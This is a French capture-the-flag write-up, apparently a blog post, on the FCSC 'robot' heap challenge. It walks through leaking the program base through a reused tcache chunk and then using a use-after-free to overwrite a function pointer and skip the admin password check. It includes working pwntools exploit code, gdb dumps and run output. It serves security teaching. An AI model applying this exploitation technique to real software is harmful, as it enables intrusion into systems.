---
title: "Robot | Hackropole"
date: "2026-03-04"
tags: ["FCSC", "Pwn", "Heap"]
excerpt: "Challenge d'exploitation du Tas."
---

# Robot

## Ressources

- Lien : [Hackropole/pwn/robot](https://hackropole.fr/fr/challenges/pwn/fcsc2023-pwn-robot/)

## Analyse

Le programme robot permet de créer un robot nommé par nous même, de le faire bouger et de rédiger un guide d'utilisation.

```bash
./robot
Que faites-vous ?
1: Construire un robot          4: Rédiger le mode d'emploi
2: Le faire parler              5: Afficher le mode d'emploi
3: Jouer avec le robot          6: Admin
0: Quitter
> 1
Comment vous l'appelez ?
> test
Vous construisez un nouveau robot. test est un très joli nom pour un robot !

Que faites-vous ?
...
> 2
Bip !
Bip !
Bip !
La discussion avec test est un peu ennuyeuse...

Que faites-vous ?
...
> 3
Vous allumez le robot. test se déplace en grinçant !
De la fumée commence à apparaître, puis des étincelles... test prend feu !!!
test est complètement détruit
```

### Les structures

```c
struct Robot
{
    char name[16];
    void (*makeNoise)();
    void (*move)();
};
```

La structure `Robot` contient:
1. Un nom pour le Robot
2. Deux pointeurs de fonction (`makeNoise()` & `move()`)

Si nous construisons un robot nommé comme ceci:

```bash
Comment vous l'appelez ?
> AAAAAAAABBBBBBBB
```

En mémoire il ressemblera à cela:

```bash
pwndbg> x/6gx 0x555555559b20
0x555555559b20: 0x0000000000000000      0x0000000000000031
0x555555559b30: 0x4141414141414141      0x0042424242424242
0x555555559b40: 0x0000555555555289      0x00005555555552fc
```

Nous avons bien nos pointeurs de fonctions:

```bash
pwndbg> x 0x0000555555555289
0x555555555289 <bleep>: 0x20ec8348e5894855
pwndbg> x 0x00005555555552fc
0x5555555552fc <roll>:  0x20ec8348e5894855
```

```c
struct RobotUserGuide
{
    char guide[32];
};
```

La structure `RobotUserGuide` permet d'écrire un guide de 32 octets.

Voici la structure dans la heap après avoir écrit un guide "AAAAAAAABBBBBBBB\n":

```bash
x/6gx 0x555555559b20
0x555555559b20: 0x0000000000000000      0x0000000000000031
0x555555559b30: 0x4141414141414141      0x4242424242424242
0x555555559b40: 0x000000000000000a      0x0000000000000000
```

### Fonctions

```c
void* newRobot(char *s)
{
    struct Robot *newrobot = malloc (sizeof(struct Robot));

    strncpy(newrobot->name, s, 15);
    newrobot->makeNoise = bleep;
    newrobot->move = roll;

    return (void*)newrobot;
}
```

Pour le nom du robot, il va écrire exactement 15 octets de ce que l'utilisateur a entré dans `name`.

```c
void admin(char *pwd)
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    char result[65];

    SHA256((const unsigned char *) pwd, strlen(pwd), hash);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
        sprintf(result + (i * 2), "%02x", hash[i]);

    if (strcmp(result, encrypted) == 0)
    {
        execl("/bin/cat", "/bin/cat", "flag.txt", NULL);
        perror("execl");
        exit(2);
    }
}
```

La fonction admin permet d'afficher le flag si le SHA256 du mot de passe que nous entrons est le même que celui attendu.

## Exploitation

Regardons d'abord les protections activées sur le binaire:

```bash
checksec --file=robot

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   90 Symbols
```

Il y a l'ASLR et PIE donc nous aurons besoin de leak des adresses, et pas de shellcode possible à première vue à cause du NX.

### Le plan

Pour obtenir un shell, il va falloir exploiter 2 vulnérabilités:
- Une sorte d'Heap information disclosure pour leak l'adresse de base du programme.
- Un Use After Free afin de réécrire un pointeur de fonction et appeler une instruction d'`admin()`.

### Préparation

Afin d'exploiter le programme il nous faut 4 fonctions pour interagir avec celui-ci:

```python
def create_robot(self, name):
    self.target.readuntil(b"0: Quitter\n")
    self.target.sendline(b'1')
    self.target.readline()
    self.target.sendline(name)
    log.info(f"Robot {name} created.")

def move_robot(self):
    self.target.readuntil(b"0: Quitter\n")
    self.target.sendline(b'3')
    self.target.readline()
    log.info("Robot removed")

def create_guide(self, content):
    self.target.readuntil(b"0: Quitter\n")
    self.target.sendline(b'4')
    self.target.readline()
    self.target.sendline(content)
    log.info(f"Guide created.")

def read_guide(self):
    self.target.readuntil(b"0: Quitter\n")
    self.target.sendline(b'5')
    content = self.target.readuntil(b"Que faites-vous ?")
    return content
```

### Leak de l'adresse de base

`sizeof(Robot)` = 32 octets et `sizeof(RobotUserGuide)` = 32 octets : les deux structures tombent dans le même tcache bin. Ainsi, quand on libère un robot puis qu'on alloue un guide, `malloc()` réutilise exactement le même chunk.

Pour leak l'adresse de base il nous faut donc construire un premier robot dans la heap, faire bouger le robot ce qui aura pour conséquence de le `free()`. Ensuite il nous faut créer un guide vide : `malloc()` va réutiliser le chunk libéré, donc le guide occupera la même zone mémoire qui contient encore les adresses des deux fonctions `bleep()` et `roll()`.

```python
bin = ELF('./robot')

def get_base_addr(self, src):
    bleep_symbole = bin.symbols["bleep"]
    bleep_addr = u64(src[18:26])
    base_addr = bleep_addr - bleep_symbole
    log.info(f"bleep symbole: {hex(bleep_symbole)}")
    log.info(f"bleep addr: {hex(bleep_addr)}")
    log.info(f"base_addr: {hex(base_addr)}")
    return base_addr

def run(self):
    self.create_robot(b"AAAA")
    self.move_robot()
    self.create_guide(b"")
    guide_content = self.read_guide()
    base_addr = self.get_base_addr(guide_content)
```

Une fois le robot libéré on a bien un chunk libre qui contient les informations du robot.

```bash
heap

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555559b20
Size: 0x30 (with flag bits: 0x31)
fd: 0x555555559

x/6gx 0x555555559b20

0x555555559b20: 0x0000000000000000      0x0000000000000031
0x555555559b30: 0x0000000555555559      0x2fa801ef5ce5f611
0x555555559b40: 0x0000555555555289      0x00005555555552fc

x 0x0000555555555289
0x555555555289 <bleep>
x 0x00005555555552fc
0x5555555552fc <roll>
```

Quand on crée un guide vide ensuite, `malloc()` réutilise le chunk. Le guide ne contient que `\n` (1 octet), donc seuls les premiers octets sont écrasés. Les pointeurs de fonction à l'offset +0x10 et +0x18 du chunk restent intacts car ils se trouvent au-delà des 16 octets correspondant au champ `name`.

```bash
heap

Allocated chunk | PREV_INUSE
Addr: 0x555555559b20
Size: 0x30 (with flag bits: 0x31)

x/6gx 0x555555559b20

0x555555559b20: 0x0000000000000000      0x0000000000000031
0x555555559b30: 0x000000055555000a      0x0000000000000000
0x555555559b40: 0x0000555555555289      0x00005555555552fc
```

Nous avons donc bien les adresses des pointeurs de fonction du robot dans notre guide.

### Calcul de l'adresse cible

En désassemblant `admin()` nous cherchons l'instruction qui appelle `execl()` — celle qui affiche le flag. Elle se trouve à `admin+0xa5` (soit +165 en décimal), juste après le `strcmp` qui vérifie le mot de passe :

```bash
14478:  75 3a    jne    14b6 <admin+0xdf>   # mauvais mot de passe → on saute
1447c:  b9 00 00 00 00    mov $0x0,%ecx     # ← admin+165, on atterrit ici
...
1449b:  e8 d0 fb ff ff    call 1070 <execl@plt>
```

En sautant directement à `admin+165`, on contourne la vérification du mot de passe et on exécute `execl("/bin/cat", "flag.txt")` directement.

```python
def run(self):
    ...
    admin_symbol = bin.symbols["admin"]
    print_flag_addr = base_addr + admin_symbol + 165
    log.info(f"admin(print flag) addr: {hex(print_flag_addr)}")
```

### Use after free

Le Use After Free est possible car après le `free()` du robot, le pointeur global vers celui-ci n'est pas mis à `NULL`. Le programme croit donc que le robot existe toujours et permet de le "faire bouger" (option 3), ce qui appelle `robot->move()` sur un chunk libéré.

Pour déclencher le UAF, il nous suffit maintenant de créer un robot, le détruire, puis créer un guide où on va remplacer la valeur de l'adresse de `move()` par l'adresse de l'instruction d'affichage du flag. Le payload se décompose ainsi : 16 octets pour écraser `name`, 8 octets pour écraser `makeNoise`, puis l'adresse cible pour `move` — soit `cyclic(24) + p64(print_flag_addr)`. Ensuite nous faisons bouger le robot, ce qui a pour finalité d'afficher le flag.

```python
def run(self):
    ...
    self.create_robot(b"BBBB")
    self.move_robot()
    payload = cyclic(24) + p64(print_flag_addr)
    log.info(f"PAYLOAD: {payload}")
    self.create_guide(payload)
    self.move_robot()
```

## Getting flag

```python
def run(self):
    ...
    output = self.target.recvall().decode('utf-8')
    flag = re.search(r'(FCSC{.*})', output).group(1)

    log.info(f"FLAG: {flag}")
```

```bash
./exploit.py -l ./robot

[+] Starting local process './robot': pid 149912
[*] Robot b'AAAA' created.
[*] Robot removed
[*] Guide created.
[*] bleep symbole: 0x1289
[*] bleep addr: 0x5605e7ea9289
[*] base_addr: 0x5605e7ea8000
[*] admin(print flag) addr: 0x5605e7ea947c
[*] Robot b'BBBB' created.
[*] Robot removed
[*] PAYLOAD: b'aaaabaaacaaadaaaeaaafaaa|\x94\xea\xe7\x05V\x00\x00'
[*] Guide created.
[*] Robot removed
[+] Receiving all data: Done (176B)
[*] Process './robot' stopped with exit code 0 (pid 149912)

[*] FLAG: FCSC{test}
```

> [Exploit complet](https://gist.github.com/debrunbaix/2ce5785faa0bc908e8fbdf1555051729)
